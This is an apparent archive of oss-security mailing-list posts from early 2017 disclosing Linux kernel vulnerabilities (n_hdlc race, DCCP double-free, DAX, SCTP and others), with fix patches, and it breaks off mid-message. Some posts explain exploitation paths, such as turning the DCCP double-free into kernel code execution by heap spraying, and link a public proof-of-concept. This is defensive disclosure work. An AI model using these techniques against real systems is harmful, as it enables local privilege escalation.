Note that I'm only asking for CVE mappings for issues that were
publicly fixed and mentioned in release notes mid-Dec, listed in Oracle
CPU mid-Jan, and had enough technical details noted in this thread or
other public bug reports.  Only giving CVE names to known issues does
not hurt anyone, and it actually helps downstreams and users already
hurt by upstream's proprietary attitude towards this open-source
project.  Of course, it's up to your discretion if and when to release
working exploits, videos, etc.

Thank you!

-- 
Tomas Hoger / Red Hat Product Security

```

</details>

## local
<details>
<summary><strong>[oss-security] Re: Linux kernel: CVE-2017-2636: local privilege escalation flaw in n_hdlc</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488909837.25722_3.Morbo,U=40182:2, -->

##### Alexander Popov <alex.popov@linux.com>, `5ced8dfa-a2e9-1dff-9708-54a76f6b4c59@linux.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hello!

This is an announcement of CVE-2017-2636, which is a race condition in
the n_hdlc Linux kernel driver (drivers/tty/n_hdlc.c). It can be exploited
to gain a local privilege escalation.

This driver provides HDLC serial line discipline and comes as a kernel module
in many Linux distributions, which have CONFIG_N_HDLC=m in the kernel config.

The bug was introduced on 22 June 2009:
https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8

My fix to the Linux kernel mainline was proposed on 28 February 2017 and
should be available soon. Please see the attachment.

I will publish my PoC exploit later, giving people some time to update
their systems.

I've found this bug investigating a suspicious kernel crash made by syzkaller
(https://github.com/google/syzkaller).

-- Bug details --

N_HDLC line discipline uses a self-made singly linked lists for data
buffers and has n_hdlc.tbuf pointer for buffer retransmitting after
an error. If sending of a data buffer is not successful, then its
address is saved in n_hdlc.tbuf and the next time n_hdlc_send_frames()
will try to resend it first of all.

But the commit be10eb7589337e5defbe214dae038a53dd21add8 ("tty: n_hdlc add
buffer flushing") introduced racy access to n_hdlc.tbuf.

After transmission error concurrent flush_tx_queue() and n_hdlc_send_frames()
can put a buffer pointed by n_hdlc.tbuf to tx_free_buf_list twice. That
causes an exploitable double free error in n_hdlc_release().

To fix the issue I used a standard kernel linked list protected by a spinlock
and got rid of n_hdlc.tbuf. In case of transmission error the current data
buffer is put after the head of tx_buf_list.

--

Kernel updates are ready, please update your systems.

Best regards,
Alexander Popov
Positive Technologies
https://www.ptsecurity.com


```

</details>
<details><summary>Additional Parts</summary>

```
From 1dea7a8061ad9212f4464464a80d0dcd477eceab Mon Sep 17 00:00:00 2001
From: Alexander Popov <alex.popov@linux.com>
Date: Tue, 28 Feb 2017 19:28:54 +0300
Subject: [PATCH 1/1] tty: n_hdlc: get rid of racy n_hdlc.tbuf

Currently N_HDLC line discipline uses a self-made singly linked list for
data buffers and has n_hdlc.tbuf pointer for buffer retransmitting after
an error.

The commit be10eb7589337e5defbe214dae038a53dd21add8
("tty: n_hdlc add buffer flushing") introduced racy access to n_hdlc.tbuf.
After tx error concurrent flush_tx_queue() and n_hdlc_send_frames() can put
one data buffer to tx_free_buf_list twice. That causes double free in
n_hdlc_release().

Let's use standard kernel linked list and get rid of n_hdlc.tbuf:
in case of tx error put current data buffer after the head of tx_buf_list.

Signed-off-by: Alexander Popov <alex.popov@linux.com>
---
 drivers/tty/n_hdlc.c | 132 +++++++++++++++++++++++++++------------------------
 1 file changed, 69 insertions(+), 63 deletions(-)

diff --git a/drivers/tty/n_hdlc.c b/drivers/tty/n_hdlc.c
index eb27883..728c824 100644
--- a/drivers/tty/n_hdlc.c
+++ b/drivers/tty/n_hdlc.c
@@ -114,7 +114,7 @@
 #define DEFAULT_TX_BUF_COUNT 3
 
 struct n_hdlc_buf {
-	struct n_hdlc_buf *link;
+	struct list_head  list_item;
 	int		  count;
 	char		  buf[1];
 };
@@ -122,8 +122,7 @@ struct n_hdlc_buf {
 #define	N_HDLC_BUF_SIZE	(sizeof(struct n_hdlc_buf) + maxframe)
 
 struct n_hdlc_buf_list {
-	struct n_hdlc_buf *head;
-	struct n_hdlc_buf *tail;
+	struct list_head  list;
 	int		  count;
 	spinlock_t	  spinlock;
 };
@@ -136,7 +135,6 @@ struct n_hdlc_buf_list {
  * @backup_tty - TTY to use if tty gets closed
  * @tbusy - reentrancy flag for tx wakeup code
  * @woke_up - FIXME: describe this field
- * @tbuf - currently transmitting tx buffer
  * @tx_buf_list - list of pending transmit frame buffers
  * @rx_buf_list - list of received frame buffers
  * @tx_free_buf_list - list unused transmit frame buffers
@@ -149,7 +147,6 @@ struct n_hdlc {
 	struct tty_struct	*backup_tty;
 	int			tbusy;
 	int			woke_up;
-	struct n_hdlc_buf	*tbuf;
 	struct n_hdlc_buf_list	tx_buf_list;
 	struct n_hdlc_buf_list	rx_buf_list;
 	struct n_hdlc_buf_list	tx_free_buf_list;
@@ -159,6 +156,8 @@ struct n_hdlc {
 /*
  * HDLC buffer list manipulation functions
  */
+static void n_hdlc_buf_return(struct n_hdlc_buf_list *buf_list,
+						struct n_hdlc_buf *buf);
 static void n_hdlc_buf_put(struct n_hdlc_buf_list *list,
 			   struct n_hdlc_buf *buf);
 static struct n_hdlc_buf *n_hdlc_buf_get(struct n_hdlc_buf_list *list);
@@ -208,16 +207,9 @@ static void flush_tx_queue(struct tty_struct *tty)
 {
 	struct n_hdlc *n_hdlc = tty2n_hdlc(tty);
 	struct n_hdlc_buf *buf;
-	unsigned long flags;
 
 	while ((buf = n_hdlc_buf_get(&n_hdlc->tx_buf_list)))
 		n_hdlc_buf_put(&n_hdlc->tx_free_buf_list, buf);
- 	spin_lock_irqsave(&n_hdlc->tx_buf_list.spinlock, flags);
-	if (n_hdlc->tbuf) {
-		n_hdlc_buf_put(&n_hdlc->tx_free_buf_list, n_hdlc->tbuf);
-		n_hdlc->tbuf = NULL;
-	}
-	spin_unlock_irqrestore(&n_hdlc->tx_buf_list.spinlock, flags);
 }
 
 static struct tty_ldisc_ops n_hdlc_ldisc = {
@@ -283,7 +275,6 @@ static void n_hdlc_release(struct n_hdlc *n_hdlc)
 		} else
 			break;
 	}
-	kfree(n_hdlc->tbuf);
 	kfree(n_hdlc);
 	
 }	/* end of n_hdlc_release() */
@@ -402,13 +393,7 @@ static void n_hdlc_send_frames(struct n_hdlc *n_hdlc, struct tty_struct *tty)
 	n_hdlc->woke_up = 0;
 	spin_unlock_irqrestore(&n_hdlc->tx_buf_list.spinlock, flags);
 
-	/* get current transmit buffer or get new transmit */
-	/* buffer from list of pending transmit buffers */
-		
-	tbuf = n_hdlc->tbuf;
-	if (!tbuf)
-		tbuf = n_hdlc_buf_get(&n_hdlc->tx_buf_list);
-		
+	tbuf = n_hdlc_buf_get(&n_hdlc->tx_buf_list);
 	while (tbuf) {
 		if (debuglevel >= DEBUG_LEVEL_INFO)	
 			printk("%s(%d)sending frame %p, count=%d\n",
@@ -420,7 +405,7 @@ static void n_hdlc_send_frames(struct n_hdlc *n_hdlc, struct tty_struct *tty)
 
 		/* rollback was possible and has been done */
 		if (actual == -ERESTARTSYS) {
-			n_hdlc->tbuf = tbuf;
+			n_hdlc_buf_return(&n_hdlc->tx_buf_list, tbuf);
 			break;
 		}
 		/* if transmit error, throw frame away by */
@@ -435,10 +420,7 @@ static void n_hdlc_send_frames(struct n_hdlc *n_hdlc, struct tty_struct *tty)
 					
 			/* free current transmit buffer */
 			n_hdlc_buf_put(&n_hdlc->tx_free_buf_list, tbuf);
-			
-			/* this tx buffer is done */
-			n_hdlc->tbuf = NULL;
-			
+
 			/* wait up sleeping writers */
 			wake_up_interruptible(&tty->write_wait);
 	
@@ -448,10 +430,12 @@ static void n_hdlc_send_frames(struct n_hdlc *n_hdlc, struct tty_struct *tty)
 			if (debuglevel >= DEBUG_LEVEL_INFO)	
 				printk("%s(%d)frame %p pending\n",
 					__FILE__,__LINE__,tbuf);
-					
-			/* buffer not accepted by driver */
-			/* set this buffer as pending buffer */
-			n_hdlc->tbuf = tbuf;
+
+			/*
+			 * the buffer was not accepted by driver,
+			 * return it back into tx queue
+			 */
+			n_hdlc_buf_return(&n_hdlc->tx_buf_list, tbuf);
 			break;
 		}
 	}
@@ -749,7 +733,8 @@ static int n_hdlc_tty_ioctl(struct tty_struct *tty, struct file *file,
 	int error = 0;
 	int count;
 	unsigned long flags;
-	
+	struct n_hdlc_buf *buf = NULL;
+
 	if (debuglevel >= DEBUG_LEVEL_INFO)	
 		printk("%s(%d)n_hdlc_tty_ioctl() called %d\n",
 			__FILE__,__LINE__,cmd);
@@ -763,8 +748,10 @@ static int n_hdlc_tty_ioctl(struct tty_struct *tty, struct file *file,
 		/* report count of read data available */
 		/* in next available frame (if any) */
 		spin_lock_irqsave(&n_hdlc->rx_buf_list.spinlock,flags);
-		if (n_hdlc->rx_buf_list.head)
-			count = n_hdlc->rx_buf_list.head->count;
+		buf = list_first_entry_or_null(&n_hdlc->rx_buf_list.list,
+						struct n_hdlc_buf, list_item);
+		if (buf)
+			count = buf->count;
 		else
 			count = 0;
 		spin_unlock_irqrestore(&n_hdlc->rx_buf_list.spinlock,flags);
@@ -776,8 +763,10 @@ static int n_hdlc_tty_ioctl(struct tty_struct *tty, struct file *file,
 		count = tty_chars_in_buffer(tty);
 		/* add size of next output frame in queue */
 		spin_lock_irqsave(&n_hdlc->tx_buf_list.spinlock,flags);
-		if (n_hdlc->tx_buf_list.head)
-			count += n_hdlc->tx_buf_list.head->count;
+		buf = list_first_entry_or_null(&n_hdlc->tx_buf_list.list,
+						struct n_hdlc_buf, list_item);
+		if (buf)
+			count += buf->count;
 		spin_unlock_irqrestore(&n_hdlc->tx_buf_list.spinlock,flags);
 		error = put_user(count, (int __user *)arg);
 		break;
@@ -825,14 +814,14 @@ static unsigned int n_hdlc_tty_poll(struct tty_struct *tty, struct file *filp,
 		poll_wait(filp, &tty->write_wait, wait);
 
 		/* set bits for operations that won't block */
-		if (n_hdlc->rx_buf_list.head)
+		if (!list_empty(&n_hdlc->rx_buf_list.list))
 			mask |= POLLIN | POLLRDNORM;	/* readable */
 		if (test_bit(TTY_OTHER_CLOSED, &tty->flags))
 			mask |= POLLHUP;
 		if (tty_hung_up_p(filp))
 			mask |= POLLHUP;
 		if (!tty_is_writelocked(tty) &&
-				n_hdlc->tx_free_buf_list.head)
+				!list_empty(&n_hdlc->tx_free_buf_list.list))
 			mask |= POLLOUT | POLLWRNORM;	/* writable */
 	}
 	return mask;
@@ -856,7 +845,12 @@ static struct n_hdlc *n_hdlc_alloc(void)
 	spin_lock_init(&n_hdlc->tx_free_buf_list.spinlock);
 	spin_lock_init(&n_hdlc->rx_buf_list.spinlock);
 	spin_lock_init(&n_hdlc->tx_buf_list.spinlock);
-	
+
+	INIT_LIST_HEAD(&n_hdlc->rx_free_buf_list.list);
+	INIT_LIST_HEAD(&n_hdlc->tx_free_buf_list.list);
+	INIT_LIST_HEAD(&n_hdlc->rx_buf_list.list);
+	INIT_LIST_HEAD(&n_hdlc->tx_buf_list.list);
+
 	/* allocate free rx buffer list */
 	for(i=0;i<DEFAULT_RX_BUF_COUNT;i++) {
 		buf = kmalloc(N_HDLC_BUF_SIZE, GFP_KERNEL);
@@ -884,53 +878,65 @@ static struct n_hdlc *n_hdlc_alloc(void)
 }	/* end of n_hdlc_alloc() */
 
 /**
+ * n_hdlc_buf_return - put the HDLC buffer after the head of the specified list
+ * @buf_list - pointer to the buffer list
+ * @buf - pointer to the buffer
+ */
+static void n_hdlc_buf_return(struct n_hdlc_buf_list *buf_list,
+						struct n_hdlc_buf *buf)
+{
+	unsigned long flags;
+
+	spin_lock_irqsave(&buf_list->spinlock, flags);
+
+	list_add(&buf->list_item, &buf_list->list);
+	buf_list->count++;
+
+	spin_unlock_irqrestore(&buf_list->spinlock, flags);
+}
+
+/**
  * n_hdlc_buf_put - add specified HDLC buffer to tail of specified list
- * @list - pointer to buffer list
+ * @buf_list - pointer to buffer list
  * @buf	- pointer to buffer
  */
-static void n_hdlc_buf_put(struct n_hdlc_buf_list *list,
+static void n_hdlc_buf_put(struct n_hdlc_buf_list *buf_list,
 			   struct n_hdlc_buf *buf)
 {
 	unsigned long flags;
-	spin_lock_irqsave(&list->spinlock,flags);
-	
-	buf->link=NULL;
-	if (list->tail)
-		list->tail->link = buf;
-	else
-		list->head = buf;
-	list->tail = buf;
-	(list->count)++;
-	
-	spin_unlock_irqrestore(&list->spinlock,flags);
-	
+
+	spin_lock_irqsave(&buf_list->spinlock, flags);
+
+	list_add_tail(&buf->list_item, &buf_list->list);
+	buf_list->count++;
+
+	spin_unlock_irqrestore(&buf_list->spinlock, flags);
 }	/* end of n_hdlc_buf_put() */
 
 /**
  * n_hdlc_buf_get - remove and return an HDLC buffer from list
- * @list - pointer to HDLC buffer list
+ * @buf_list - pointer to HDLC buffer list
  * 
  * Remove and return an HDLC buffer from the head of the specified HDLC buffer
  * list.
  * Returns a pointer to HDLC buffer if available, otherwise %NULL.
  */
-static struct n_hdlc_buf* n_hdlc_buf_get(struct n_hdlc_buf_list *list)
+static struct n_hdlc_buf *n_hdlc_buf_get(struct n_hdlc_buf_list *buf_list)
 {
 	unsigned long flags;
 	struct n_hdlc_buf *buf;
-	spin_lock_irqsave(&list->spinlock,flags);
-	
-	buf = list->head;
+
+	spin_lock_irqsave(&buf_list->spinlock, flags);
+
+	buf = list_first_entry_or_null(&buf_list->list,
+						struct n_hdlc_buf, list_item);
 	if (buf) {
-		list->head = buf->link;
-		(list->count)--;
+		list_del(&buf->list_item);
+		buf_list->count--;
 	}
-	if (!list->head)
-		list->tail = NULL;
-	
-	spin_unlock_irqrestore(&list->spinlock,flags);
+
+	spin_unlock_irqrestore(&buf_list->spinlock, flags);
 	return buf;
-	
 }	/* end of n_hdlc_buf_get() */
 
 static char hdlc_banner[] __initdata =
-- 
2.7.4



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489010533.23073_1.Morbo,U=40340:2, -->

##### Alexander Popov <alex.popov@linux.com>, `2f565778-3ee1-e311-e378-2d7d91e2c19a@linux.com`

```
Hello,

There is some additional information about CVE-2017-2636:

On 07.03.2017 20:45, Alexander Popov wrote:
> This is an announcement of CVE-2017-2636, which is a race condition in
> the n_hdlc Linux kernel driver (drivers/tty/n_hdlc.c). It can be exploited
> to gain a local privilege escalation.
> 
> This driver provides HDLC serial line discipline and comes as a kernel module
> in many Linux distributions, which have CONFIG_N_HDLC=m in the kernel config.

Exploiting the flaw in the vulnerable module n_hdlc does not require
Microgate or SyncLink hardware. The module is automatically loaded if an
unprivileged user opens a pseudoterminal and calls TIOCSETD ioctl for it
setting N_HDLC line discipline.

The fix is currently on the way to the mainline kernel:
https://git.kernel.org/cgit/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=82f2341c94d270421f383641b7cd670e474db56b

Some Linux distributions have already provided the security update.

However, you can mitigate the flaw manually by blocking n_hdlc autoloading
by a system-wide modprobe rule in /etc/modprobe.d/ (refer to your Linux
distribution documentation). In that case please check that n_hdlc is not
already loaded.

Best regards,
Alexander


```

</details>

## tnef
<details>
<summary><strong>[oss-security] Advisory X41-2017-004: Multiple Vulnerabilities in tnef</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_26.NdNdNx,U=7709:2,ST -->

##### X41 D-Sec GmbH Advisories <advisories@x41-dsec.de>, `46fe3e2c-05b5-f574-4bd6-eb62ad99b68c@x41-dsec.de`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEpwxVTgxAIcUvTugIo5Klpg50CxAFAlivE6IACgkQo5Klpg50
CxCWSg/9EH5A9b2zWNtj5E5wE5Q/asS18QeG7TO45UK1eCXB8BCpCTx1aYd3uBEm
ECLyYLvC7Ol7+ouq3UVaPayOAE/G12vOM6PsYuXeWZkZEn1zCAypjAMb7hSc3kwN
Oh7TEJZNWioSwDx3hd9UoWoFW2wiCjKcMj+/NILkDwaZN6oTt9zysfTb3cUTuyet
4N8txEMan5pGOMN20qWKp7J7VaRwqG8/NDKo0MnJllZzV5HjuIhkN1ZFLiHM65Q8
r3Xpt3zeIyxAZq4zwK+wTcXFlYFE+d19s+JtD6pO4x+IrjGuDar8eTJ0F4NY0ISC
/TYlSDmmLW9d7+EJ17IPWHxxAXPbRsVCYPhwrrwSG3tGb2D0NDaFoWQBkkL9+yf9
J9KgBWgGOCkTj8OWeyoA2us6OMYh6JsJ1HiuSs2LgVtRymQz8Mz/eYWHz78hvIsm
RLVcCWBS9QXGxNJgGcqhv/fnYUwze+0lhN6rE6lmPIqI0IgboyxfcjfQ1nXoOZlt
xgG6jonoZ0aROolWRvQP51ZhkzeNpVWVk8JCshaLpIlYaUPxACpg2f0zb5E/UWVJ
IDpBADp6nVry6XxFM2Y26dVF9sx3jK+n3qemTlBYvHcagYraeMVRpXiutyDobk14
43pJ4MF0DYTgLZNqnfJk4dRZhD7yakP7W3uX7zJ+/r1XUSO6Q8Q=
=xcka
-----END PGP SIGNATURE-----


```

</details>

---

</details>

## linux-kernel
<details>
<summary><strong>[oss-security] Security issue in Linux kernel (v4.5+) persistent memory enabling</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488922362.2721_1.Morbo,U=40194:2, -->

##### Dan Williams <dan.j.williams@intel.com>, `CAPcyv4h6sA6Sx4wmY_XH0VoTNeVYu0Szd4hdmAdfsNZzwX-H-w@mail.gmail.com`

```
The patch below fixes a high severity, but limited exposure, security
issue in the direct-I/O support for DAX mappings. High severity in
that any file that can be read can be written, limited exposure in
that it requires uncommon platform resources (persistent memory),
usage of the still flagged "experimental" DAX support in XFS/EXT4, and
non-default configuration to enable direct-I/O for DAX mappings
(details below).

It has been posted publicly on the Linux kernel development mailing list here:

https://lkml.org/lkml/2017/2/25/108

---
mm: fix gup_pte_range() vs DAX mappings

gup_pte_range() fails to check pte_allows_gup() before translating a DAX
pte entry, pte_devmap(), to a page. This allows writes to read-only
mappings, and bypasses the DAX cacheline dirty tracking due to missed
'mkwrite' faults. The gup_huge_pmd() path and the gup_huge_pud() path
correctly check pte_allows_gup() before checking for _devmap() entries.

Cc: <stable@vger.kernel.org>
Cc: Dave Hansen <dave.hansen@linux.intel.com>
Reported-by: Xiong Zhou <xzhou@redhat.com>
Reported-by: Ross Zwisler <ross.zwisler@linux.intel.com>
Fixes: 3565fce3a659 ("mm, x86: get_user_pages() for dax mappings")
Signed-off-by: Ross Zwisler <ross.zwisler@linux.intel.com>
Signed-off-by: Dan Williams <dan.j.williams@intel.com>
---
 arch/x86/mm/gup.c | 8 ++++++--
 1 file changed, 6 insertions(+), 2 deletions(-)

diff --git a/arch/x86/mm/gup.c b/arch/x86/mm/gup.c
index 99c7805a9693..9d32ee608807 100644
--- a/arch/x86/mm/gup.c
+++ b/arch/x86/mm/gup.c
@@ -120,6 +120,11 @@ static noinline int gup_pte_range(pmd_t pmd,
unsigned long addr,
  return 0;
  }

+ if (!pte_allows_gup(pte_val(pte), write)) {
+ pte_unmap(ptep);
+ return 0;
+ }
+
  if (pte_devmap(pte)) {
  pgmap = get_dev_pagemap(pte_pfn(pte), pgmap);
  if (unlikely(!pgmap)) {
@@ -127,8 +132,7 @@ static noinline int gup_pte_range(pmd_t pmd,
unsigned long addr,
  pte_unmap(ptep);
  return 0;
  }
- } else if (!pte_allows_gup(pte_val(pte), write) ||
-   pte_special(pte)) {
+ } else if (pte_special(pte)) {
  pte_unmap(ptep);
  return 0;
  }
-- 
2.7.4

---

The vulnerability was introduced in kernel v4.5. It requires the
following configuration options to be enabled

CONFIG_ZONE_DEVICE
CONFIG_FS_DAX
CONFIG_BLK_DEV_PMEM

The above three options plus defining persistent memory with the
memmap=ss!nn kernel command line parameter creates a pmem block device
that will expose the failing condition if an xfs or ext4 filesytem is
mounted on it with the "-o dax" mount option.

CONFIG_ACPI_NFIT
CONFIG_NVDIMM_PFN

The memmap=ss!nn method of defining persistent memory is primarily
used for testing. Starting with ACPI 6, platform firmware publishes an
NFIT (NVDIMM Firmware Interface Table) to describe persistent memory
resources. Persistent memory described by an NFIT does not support
direct-I/O by default and the CONFIG_NVDIMM_PFN mechanism must be used
to enable direct-I/O. The "ndctl" utility is used to reconfigure an
NFIT-defined pmem device with direct-I/O support [1]

[1]: https://lists.01.org/pipermail/linux-nvdimm/2017-February/008808.html

```

</details>
<details>
<summary><strong>[oss-security] Linux: net/llc: avoid BUG_ON() in skb_orphan() (CVE-2017-6345)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_142.Morbo,U=37981:2, -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170228162802.5rmgjzynfz7r7e7c@eldamar.local`

```
Hi

CVE-2017-6345 was assigned by MITRE to the following (via
https://cveform.mitre.org/):

https://git.kernel.org/linus/8b74d439e1697110c5e5c600643e823eb1dd0762

> net/llc: avoid BUG_ON() in skb_orphan()
> 
> It seems nobody used LLC since linux-3.12.
> 
> Fortunately fuzzers like syzkaller still know how to run this code,
> otherwise it would be no fun.
> 
> Setting skb->sk without skb->destructor leads to all kinds of
> bugs, we now prefer to be very strict about it.
> 
> Ideally here we would use skb_set_owner() but this helper does not exist yet,
> only CAN seems to have a private helper for that.

The fix was backported to 4.9.13 as well.

Regards,
Salvatore

```

</details>
<details>
<summary><strong>[oss-security] Linux: packet: fix races in fanout_add() (CVE-2017-6346)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_141.Morbo,U=37980:2,S -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170228162524.47jesr3zopycriir@eldamar.local`

```
Hi

CVE-2017-6346 was assigned by MITRE to the following (via
https://cveform.mitre.org/):

https://git.kernel.org/linus/d199fab63c11998a602205f7ee7ff7c05c97164b

> packet: fix races in fanout_add()
> 
> Multiple threads can call fanout_add() at the same time.
> 
> We need to grab fanout_mutex earlier to avoid races that could
> lead to one thread freeing po->rollover that was set by another thread.
> 
> Do the same in fanout_release(), for peace of mind, and to help us
> finding lockdep issues earlier.

Since 4.2 the races can lead to a use-after-free.

The fix was backported to 4.9.13 as well.

Regards,
Salvatore

```

</details>
<details>
<summary><strong>[oss-security] Linux: irda: Fix lockdep annotations in hashbin_delete() (CVE-2017-6348)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_139.Morbo,U=37978:2,S -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170228162034.qlety2rdz2skpomr@eldamar.local`

```
Hi

CVE-2017-6348 was assigned by MITRE to the following (via
https://cveform.mitre.org/):

https://git.kernel.org/linus/4c03b862b12f980456f9de92db6d508a4999b788

> irda: Fix lockdep annotations in hashbin_delete().
> 
> A nested lock depth was added to the hasbin_delete() code but it
> doesn't actually work some well and results in tons of lockdep splats.
> 
> Fix the code instead to properly drop the lock around the operation
> and just keep peeking the head of the hashbin queue.

Quoting a note from Ben Hutchins: "This actually changes locking, not just
lockdep annotations. So I think it fixes a potential deadlock."

The fix was as well backported to 4.9.13.

Regards,
Salvatore

```

</details>
<details>
<summary><strong>[oss-security] Linux: CVE-2017-6353: sctp: deny peeloff operation on asocs with threads sleeping on it</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488282778.6135_24.NdNdNx,U=7880:2,T -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170227120706.3entdizfnyz5iwrf@lorien.valinor.li`

```
Hi

Via the CVE webform, MITRE has assigned CVE-2017-6353 for:

https://marc.info/?l=linux-netdev&m=148785309416337&w=2

>Subject:    [PATCH net] sctp: deny peeloff operation on asocs with threads sleeping on it
>From:       Marcelo Ricardo Leitner <marcelo.leitner () gmail ! com>
>Date:       2017-02-23 12:31:18
>
>commit 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf")
>attempted to avoid a BUG_ON call when the association being used for a
>sendmsg() is blocked waiting for more sndbuf and another thread did a
>peeloff operation on such asoc, moving it to another socket.
>
>As Ben Hutchings noticed, then in such case it would return without
>locking back the socket and would cause two unlocks in a row.
>
>Further analysis also revealed that it could allow a double free if the
>application managed to peeloff the asoc that is created during the
>sendmsg call, because then sctp_sendmsg() would try to free the asoc
>that was created only for that call.
>
>This patch takes another approach. It will deny the peeloff operation
>if there is a thread sleeping on the asoc, so this situation doesn't
>exist anymore. This avoids the issues described above and also honors
>the syscalls that are already being handled (it can be multiple sendmsg
>calls).
>
>Joint work with Xin Long.
>
>Fixes: 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf")
>Cc: Alexander Popov <alex.popov@linux.com>
>Cc: Ben Hutchings <ben@decadent.org.uk>
>Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>
>Signed-off-by: Xin Long <lucien.xin@gmail.com>
>---
>Hi, please consider this one for -stable too. Thanks
>
> net/sctp/socket.c | 8 ++++++--
> 1 file changed, 6 insertions(+), 2 deletions(-)
>
>diff --git a/net/sctp/socket.c b/net/sctp/socket.c
>index 1b5d669e30292a57ed57dd920d81be2a57f97b22..d04a8b66098c8a574642b026bff990ac64c21468 100644
>--- a/net/sctp/socket.c
>+++ b/net/sctp/socket.c
>@@ -4734,6 +4734,12 @@ int sctp_do_peeloff(struct sock *sk, sctp_assoc_t id, struct socket **sockp)
> 	if (!asoc)
> 		return -EINVAL;
> 
>+	/* If there is a thread waiting on more sndbuf space for
>+	 * sending on this asoc, it cannot be peeled.
>+	 */
>+	if (waitqueue_active(&asoc->wait))
>+		return -EBUSY;
>+
> 	/* An association cannot be branched off from an already peeled-off
> 	 * socket, nor is this supported for tcp style sockets.
> 	 */
>@@ -7426,8 +7432,6 @@ static int sctp_wait_for_sndbuf(struct sctp_association *asoc, long *timeo_p,
> 		 */
> 		release_sock(sk);
> 		current_timeo = schedule_timeout(current_timeo);
>-		if (sk != asoc->base.sk)
>-			goto do_error;
> 		lock_sock(sk);
> 
> 		*timeo_p = current_timeo;
>-- 
>2.9.3

This was found while reviewing the fix of CVE-2017-5986 (2dcab5984841
("sctp: avoid BUG_ON on sctp_wait_for_sndbuf"))

Regards,
Salvatore

```

</details>
<details>
<summary><strong>[oss-security] Re: Linux kernel: CVE-2017-6074: DCCP double-free vulnerability (local root)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487817413.10507_87.NdNdNx,U=37344:2, -->

##### Andrey Konovalov <andreyknvl@google.com>, `CAAeHK+xECAFQigwhfNWhrQBronMHWKxcLkWAfnqKo4WEtquPTg@mail.gmail.com`

```
Hi,

This is an announcement about CVE-2017-6074 [1] which is a double-free
vulnerability I found in the Linux kernel. It can be exploited to gain
kernel code execution from an unprivileged processes.

Fixed on Feb 17, 2017:
https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4

The oldest version that was checked is 2.6.18 (Sep 2006), which is
vulnerable. However, the bug was introduced before that, probably in
the first release with DCCP support (2.6.14, Oct 2005).

The kernel needs to be built with CONFIG_IP_DCCP for the vulnerability
to be present. A lot of modern distributions enable this option by
default.

The bug was found with syzkaller [2].

### Bug details

In the current DCCP implementation an skb for a DCCP_PKT_REQUEST
packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if
dccp_v6_conn_request successfully returns [3].

However, if IPV6_RECVPKTINFO is set on a socket, the address of the
skb is saved to ireq->pktopts and the ref count for skb is incremented
in dccp_v6_conn_request [4], so skb is still in use. Nevertheless, it
still gets freed in dccp_rcv_state_process.

The fix is to call consume_skb, which accounts for skb->users,
instead of doing goto discard and therefore calling __kfree_skb.

To exploit this double-free, it can be turned into a use-after-free:

//  The first free:
kfree(dccp_skb)
// Another object allocated on the same place as dccp_skb:
some_object = kmalloc()
// The second free, effectively frees some_object
kfree(dccp_skb)

As this point we have a use-after-free on some_object. An attacker can
control what object that would be and overwrite it's content with
arbitrary data by using some of the kernel heap spraying techniques.
If the overwritten object has any triggerable function pointers, an
attacker gets to execute arbitrary code within the kernel.

I'll publish an exploit in a few days, giving people time to update.

New Ubuntu kernels are out so please update as soon as possible.

### Timeline

2017-02-15: Bug reported to security@kernel.org
2017-02-16: Patch submitted to netdev
2017-02-17: Patch committed to mainline kernel
2017-02-18: Notification sent to linux-distros
2017-02-22: Public announcement

### Links

[1] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6074
[2] https://github.com/google/syzkaller
[3] http://lxr.free-electrons.com/source/net/dccp/input.c?v=4.9#L606
[4] http://lxr.free-electrons.com/source/net/dccp/ipv6.c?v=4.9#L351
[5] https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Spam/cur/1488144025.28364_385.NdNdNx,U=391:2, -->

##### Andrey Konovalov <andreyknvl@google.com>, `CAAeHK+yy0A9M73-vx+B5VtMQo3hH88h_jvmJ=0-UiRhd9rh6xA@mail.gmail.com`

```
I've uploaded the proof-of-concept exploit here:
https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074

It includes a SMEP/SMAP bypass, however it's not very reliable. The
exploit was tested on Ubuntu 16.04 with 4.4.0-62-generic kernel. It
will most likely crash on anything else, unless you at least update
the offsets.

A little detail that's missing from the initial announcement is that
this bug is technically a use-after-free followed by a double-free.
The kernel frees skb in dccp_rcv_state_process and then again when
destroying the socket due to inet6_destroy_sock. There's actually a
lot more stuff going on under the hood, but that's the essential part.

The use-after-free happens on skb and skb->data (they are allocated
and freed separately though one right after another). Exploiting this
